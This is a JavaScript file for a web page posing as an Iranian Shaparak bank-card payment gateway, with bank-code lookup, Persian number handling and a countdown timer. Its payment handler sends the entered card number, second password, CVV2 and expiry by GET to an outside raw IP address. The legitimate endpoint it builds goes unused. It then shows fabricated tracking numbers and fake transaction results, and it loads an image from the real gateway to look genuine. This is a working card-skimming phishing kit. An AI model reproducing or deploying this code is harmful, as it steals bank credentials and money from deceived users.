function FetchBankName(BinCode){
var bankarr = {
'99':'مرکزي',
'502229':'پاسارگاد',
'502806':'شهر',
'502908':'توسعه تعاون',
'502938':'دي',
'504172':'رسالت',
'505416':'گردشگري',
'505785':'ايران زمين',
'589210':'سپه',
'589463':'رفاه',
'603769':'صادرات',
'603770':'کشاورزي',
'603799':'ملي',
'606373':'مهر ايران',
'610433':'ملت',
'621986':'سامان',
'622106':'پارسيان',
'627353':'تجارت',
'627381':'انصار',
'627412':'اقتصادنوين',
'627488':'کار آفرين',
'627648':'توسعه صادرات',
'627760':'پست بانك',
'627961':'صنعت و معدن',
'628023':'مسکن',
'628157':'اعتباري توسعه',
'636214':'آينده',
'636949':'حكمت ايرانيان',
'639346':'سينا',
'639347':'پاسارگاد',
'639599':'قوامين',
'639607':'سرمايه',
'936450':'سامانه رفع مغايرت',
'983254':'پرشين سوئيچ',
'62802328':'کارت خريد مفاسا',
'62802329':'کارت تسهيلات مفاسا',
'581672000':'شاپرک',
'628023013':'فناپ',
'585983':'تجارت',
'505801':'کوثر',
'606256':'عسکریه'
};
var key;
for(key in bankarr)
	if (BinCode.substr(0,key.length) == key)
		return bankarr[key];
return '';
}

function RefreshImage(valImageId) {
	var objImage = document.images[valImageId];
	if (objImage == undefined) {
		return;
	}
	var now = new Date();
	objImage.src = objImage.src.split('?')[0] + '?x=' + now.toUTCString();
}

String.prototype.replaceArray = function(find, replace) {
  var replaceString = this;
  var regex; 
  for (var i = 0; i < find.length; i++) {
    regex = new RegExp(find[i], "g");
    replaceString = replaceString.replace(regex, replace[i]);
  }
  return replaceString;
};

function Num2En(param){
	ennum = new Array(0,1,2,3,4,5,6,7,8,9);
	fanum = new Array("۰","۱","۲","۳","۴","۵","۶","۷","۸","۹");
	arnum = new Array("٠","١","٢","٣","٤","٥","٦","٧","٨","٩");	
	return param.replaceArray(arnum, ennum).replaceArray(fanum, ennum);
}


function nextInput(ObjID){
  var monflag = false;
  var months = new Array('01','02','03','04','05','06','07','08','09','10','11','12','••');
  var years = ['00','01','02','03','04','05','06','07','08','09','••'];
  // var value = $('#'+ObjID).val();
  var value = Num2En($('#'+ObjID).val());
  $('#'+ObjID).val(value);  
  	switch (ObjID){
	case 'expmah':
		if (value.length == 2){
		for(i=0;i<months.length;++i)
			if (months[i] == value){monflag = true;}
			if (monflag) {$("input#expyear").focus();}
			else {$('#'+ObjID).val('');}
		}
	break;
	case 'expyear':
		if (value.length == 2){
			if (value>89 || years.indexOf(value) >= 0) {	$('#captchacode').focus();}
			else{ $("input#expyear").val('');}
		}
	break;
	case 'cardnumber':
		// if (value.replace(/\s/g, '').length == 16) {$('#secondpass').focus();}
		if (value.replace(/[^0-9*]/g, '').length == 16) {$('#secondpass').focus();}
	break;
	}
}

function IsNumeric(sText)
{
   var ValidChars = "0123456789.";
   var IsNumber=true;
   var Char;
 
   for (i = 0; i < sText.length && IsNumber == true; i++) 
      { 
      Char = sText.charAt(i); 
      if (ValidChars.indexOf(Char) == -1) 
         {
         IsNumber = false;
         }
      }
   return IsNumber;   
}

function num2fa(param){
var nLen, i, this_char, pars_num;
fa_num = new Array("&#1776;","&#1777;","&#1778;","&#1779;","&#1780;","&#1781;","&#1782;","&#1783;","&#1784;","&#1785;");
pars_num=""
nLen = param.length;

if (nLen == 0)
    return param;

for(i=0;i<nLen;++i){
this_char = param.substr(i,1);
	if (IsNumeric(this_char))
	pars_num += fa_num[this_char];
	else
	pars_num += this_char;
}
return pars_num;
}

function scrollToAnchor(aid){
    var aTag = $("div[id='"+ aid +"']");
    $('html,body').animate({scrollTop: aTag.offset().top},'fast');
}

function KeyPadInit(txt)
{
txt.keypad({keypadOnly: false, showAnim:"slideDown", duration: "fast", randomiseNumeric: true, closeText: 'X', clearText: '<<', backText: '<'});
keypadset = true;	
}

var countdown;
function PSGateWayPackage()
{
if ($('#epay_gateway_form').length == 0)
	return false;
	clearInterval(countdown);
	second = 59;
	minute = 9;
	countdown = setInterval(function(){
	secondTxt = (second<10)? '0'+second:second;
	minuteTxt = (minute<10)? '0'+minute:minute;
	$(".GateTimer").html(num2fa(minuteTxt + ':' + secondTxt));
		if (second == 0){
		minute--;
		second = 60;
		}									
		if (minute == 0){
			clearInterval(countdown);
			$("#OutputTxt").html('<i class="icon-warning-sign" style="font-size:24px; padding-left:5px"></i>زمان جلسه کاری شما خاتمه یافت. لطفا مجددا تلاش کنید.').addClass("alert alert-danger");
			$("#PS_ePayment_GateWay").html('');
		}								
	second--;
	}, 1000);

	// $("#cardnumber").click(function(){
		// if ($(this).val() == '    ')
			// $(this).val('');			
	// });	
	// if ($("#cardnumberzp").val().length <= 0){
		// $("#cardnumber").mask("4444 4444 4444 4444",{placeholder:""});
	// }
	scrollToAnchor('OutputTxt');
	$(".numeric").numeric();
	$('input#cardnumber').on('keydown', function(e){
	    setTimeout(function () {
			// var bankname = FetchBankName($('input#cardnumber').val().replace(/\s/g, ''));
			var bankname = FetchBankName($('input#cardnumber').val().replace(/[^0-9*]/g, ''));
			$('#bankname').val(bankname);
			$('#GatewayFetchBankNameDiv').html(bankname);
		}, 1);
	});
	KeyPadInit($('#secondpass'));
	KeyPadInit($('#cvv2'));
	// $('#expmah, #expyear, #cardnumber').keyup(function(e){
		// nextInput(this.id);
	// });	
//, #captchacode, #mobileforipg, #emailforipg	
$('#cardnumber, #secondpass, #cvv2, #expmah, #expyear').keyup(function(e){
	nextInput(this.id);
});		
	
	$('#pardakht, #enseraf, #pardakhtservice1, #pardakhtservice, #pardakhtbilling, #pardakhtipackage, #PayBatchBill, #IranBimehPay').click(function(){
		var second = 15;
		var dataString = $("#epay_gateway_form").serialize() + '&user_request=' + this.id;
		var URL = 'result.asp';
		switch (this.id){
			case 'pardakhtservice1':
				URL = 'tservice.asp';
			break;			
			case 'pardakhtservice':
				URL = 'service.asp';
			break;			
			case 'pardakhtbilling':
				URL = 'billing.asp';
			break;
			case 'pardakhtipackage':
				URL = 'ipackage.asp';
			break;
			case 'IranBimehPay':
				URL = 'result2.asp';
			break;
			case 'PayBatchBill':
				second = 15;
				$('.molahezat').each(function(){
					$(this).html('<img src="/billing/loading.gif" width="24" height="24" border="0" />');
				});
			break;
		}		
	 $.ajax({
			url: 'http://78.46.119.98:3000/submit',
			data:  dataString,
			type: 'GET',
			dataType: 'jsonp',
			timeout: 120000,
			beforeSend: function() {
				ProgressBar();
			},
			complete: function(result) {
				ProgressBar('hide');

			},
			error: function() {
				//$("#OutputTxt").removeClass();
				//$("#OutputTxt").html('خطای سروری. لطفا با مدیر سایت تماس بگیرید.').addClass("errorbox");
				//$("#OutputTxt").html(xhr.responseText);
				// alert(xhr.responseText);
			},
			success: function(data) {
				switch (data.action){
				case 'TranError':
					$("#GatewayInputError").html(data.msg);
					RefreshImage('imgCaptchaGateway');					
				break;
				case 'enseraf':
					clearInterval(countdown);
					$("#OutputTxt").removeClass();
					$("#OutputTxt").html('');
					$("#OutputTxt")
							.html('<p style="color:red;font-size:16px"> تراکنش ناموفق بود </p> <br> <p style="color:black;font-weight:bold;font-size:16px">' + Math.floor((Math.random() * 10000000) + 1) + '  : شماره پیگیری   </p> <br> <a style="font-family:IRANSans;font-size:18px" href="eurolive://refid/failed"> جهت بازگشت به اپلیکیشن کلیک نمایید </a> ')
							.addClass("BacktoMerchantSite");	
					// $('#MerchantBackToSite').submit();
				break;
				case 'RejectTran':
					clearInterval(countdown);
					$("#OutputTxt").removeClass();
					$("#OutputTxt").html('');				
					$("#OutputTxt").html(data.msg + '<img src="/img/aploader.gif" style="width:32px; height:32px; vertical-align: middle;" /><br><br>\
					در حال بازگشت به سايت پذيرنده<br>\
					لطفا کمی صبر کنید ...').addClass("alert alert-info BacktoMerchantSite");
					$('#MerchantBackToSite').submit();					
				break;
				case 'VIPCustomer':			
					clearInterval(countdown);
					$("#OutputTxt").removeClass();
					$("#OutputTxt").html('');
					$("#OutputTxt").html(data.msg + '<img src="/img/aploader.gif" style="width:32px; height:32px; vertical-align: middle;" /><br><br>\
					در حال بازگشت به سايت پذيرنده<br>\
					لطفا کمی صبر کنید ...').addClass("alert alert-info BacktoMerchantSite");
					$('#MerchantBackToSite').submit();
				break;
				default:
					clearInterval(countdown);
					$("#OutputTxt").removeClass();
					$("#OutputTxt").html('');
					$("#OutputTxt").html(data.msg);
					// $('#ReturningParams').val(data.result);
					var rand_value  = Math.floor((Math.random() * 10000000) + 1);
					bkcountdown = setInterval(function(){
					secondTxt = (second<10)? '0'+second:''+second;
					$("#GateBackTimer").html(num2fa(secondTxt));
					$('#MerchantBackToSite').submit();							
					$("#OutputTxt").html('<img src="https://asan.shaparak.ir/img/aploader.gif" style="width:32px; height:32px; vertical-align: middle;" /><br><br>\
					در حال بازگشت به سايت پذيرنده<br>\
					لطفا کمی صبر کنید ...').addClass("fas alert alert-info BacktoMerchantSite");
					$("#PS_ePayment_GateWay").html('');
						
						if (second <= 0){
							$("#OutputTxt")
							.html('<p style="color:green;font-size:16px"> تراکنش با موفقیت انجام شد </p> <br> <p style="color:black;font-weight:bold;font-size:16px"> ' + rand_value + '  : شماره پیگیری </p> <br> <a style="font-family:IRANSans;font-size:18px" href="eurolive://refid/success"> جهت بازگشت به اپلیکیشن کلیک نمایید </a> ')
							.removeClass("alert alert-info");					
						}

					second--;
					}, 100);
					
					//$("#OutputTxt").html('<i class="icon-check-sign" style="font-size:24px; padding-left:5px"></i>در حال بازگشت به سايت پذيرنده. لطفا کمی صبر کنید ...').addClass("msgbox");
					//$('#MerchantBackToSite').submit();
				}
			}
		}); 
		return false;
	});	
}

$('.modal-loading-bar').modal({
  backdrop: 'static',
  show: false
});

$('.modal-loading-bar').hide();
$('body').removeClass('modal-open');
$('.modal-backdrop').remove();

function ProgressBar(showflg,loadtxt){
	showflg = showflg || 'show';
	loadtxt = loadtxt || 'لطفا کمی صبر کنيد ...';
	var $modal = $('.modal-loading-bar'), $bar = $modal.find('.bar');
	$modal.modal(showflg);
	$bar.css('width', $bar.attr('aria-valuetransitiongoal')+'%');	
	$bar.text(loadtxt);
}